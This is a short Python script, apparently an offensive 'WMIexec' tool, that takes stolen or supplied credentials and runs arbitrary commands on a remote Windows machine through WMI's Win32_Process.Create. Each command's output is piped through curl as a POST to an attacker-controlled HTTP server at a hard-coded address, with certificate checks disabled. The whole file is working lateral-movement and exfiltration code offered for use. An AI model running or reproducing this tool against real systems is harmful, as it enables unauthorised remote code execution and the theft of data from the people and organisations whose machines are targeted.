#this works

import wmi, argparse

webserver = "https://10.0.0.5:8080" #change to your HTTP server IP and port where you will get the output

def execute_command_wmi(command, username, password, target_computer):
    # Create a WMI connection with authentication
    c = wmi.WMI(computer=target_computer, user=username, password=password)
    
    print("[+] Connected to the remote WMI instance")

    # Use the Win32_Process class to execute the command
    process_id, result = c.Win32_Process.Create(CommandLine=command)

    if result == 0:
        print(f"[+] Command executed successfully. Process ID: {process_id}")
    else:
        print("[-] Failed to execute command.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Custom WMIexec script created by @kleiton0x7e')
    parser.add_argument('-i', '--ip', action='store', required = True, help='The IP address/ hostname of the server')
    parser.add_argument('-u', '--username', action='store', required = True, help='The username used for authentication')
    parser.add_argument('-p', '--password', action='store', required = True, help='The password used for authentication')
    parser.add_argument('-c', '--command', action='store', required = True, help='The command to be executed')
    args = parser.parse_args()

    execute_command_wmi("cmd /Q /c " + str(args.command)  + " | curl -X POST -k -H 'Content-Type: text/plain' --data-binary @- " + webserver, str(args.username), str(args.password), str(args.ip))
